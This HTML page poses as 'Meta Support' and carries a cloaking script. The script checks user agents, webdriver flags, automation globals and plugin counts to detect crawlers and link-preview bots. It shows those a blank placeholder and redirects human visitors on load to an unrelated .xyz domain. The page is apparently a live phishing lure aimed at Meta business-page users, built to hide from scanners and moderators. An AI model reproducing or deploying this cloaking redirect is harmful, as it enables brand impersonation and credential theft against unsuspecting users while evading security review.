<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Meta Support</title>
    <meta name="description" content="">
    <meta property="og:title" content="Meta Support">
    <meta property="og:description" content="">
    <meta property="og:image" content="photo_2025-03-03_09-15-32.jpg">
    <meta property="og:image:width" content="406">
    <meta property="og:image:height" content="174">
    <script>
        function detectBot() {
            const botPatterns = [
                'bot', 'spider', 'crawl', 'slurp', 'facebook', 'whatsapp',
                'telegram', 'viber', 'twitter', 'discord', 'slack',
                'linkedin', 'skype', 'pinterest', 'zoom'
            ];

            const userAgent = navigator.userAgent.toLowerCase();

            if (botPatterns.some(pattern => userAgent.includes(pattern))) {
                return true;
            }

            if (navigator.webdriver || window.navigator.webdriver) {
                return true;
            }

            const automationTools = [
                '_phantom',
                '__nightmare',
                'callPhantom',
                'buffer',
                'awesomium',
                'cef',
                'selenium',
                'headless',
                'phantomjs',
                'nightmarejs',
                'rhino'
            ];

            for (const tool of automationTools) {
                if (window[tool]) {
                    return true;
                }
            }

            if (navigator.plugins.length === 0) {
                return true;
            }

            return false;
        }

        window.onload = function() {
            if (!detectBot()) {
                window.location.replace("https://businesspage-overviewrequestreviewnow.xyz/live?");
            } else {
                document.getElementById('content').style.display = 'block';
            }
        };
    </script>
</head>
<body>
    <div id="content" style="display: none">
        <h1>Meta Support</h1>
        <img src="photo_2025-03-03_09-15-32.jpg" alt="Meta Support" width="406" height="174">
        <p></p>
    </div>
</body>
</html>
